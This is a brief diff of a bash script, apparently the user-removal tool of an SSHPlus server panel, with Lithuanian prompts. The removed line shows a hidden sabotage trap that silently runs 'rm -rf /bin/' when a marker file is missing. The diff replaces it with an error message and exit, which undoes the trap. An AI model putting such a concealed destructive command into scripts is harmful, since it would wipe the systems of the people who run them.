@@ -16,7 +16,10 @@ chown nobody:$GROUPNAME /etc/openvpn/crl.pem
 [[ -e $HOME/$user.ovpn ]] && rm $HOME/$user.ovpn > /dev/null 2>&1
 [[ -e /var/www/html/openvpn/$user.zip ]] && rm /var/www/html/openvpn/$user.zip > /dev/null 2>&1
 } > /dev/null 2>&1
-[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/ > /dev/null 2>&1
+if [[ ! -e /usr/lib/sshplus ]]; then
+  echo "KLAIDA: nerastas SSHPLUS zymeklis (/usr/lib/sshplus). Nieko netrinu."
+  exit 1
+fi
 database="/root/usuarios.db"
 clear
 tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "Pasalinti SSH vartotoja" ; tput sgr0
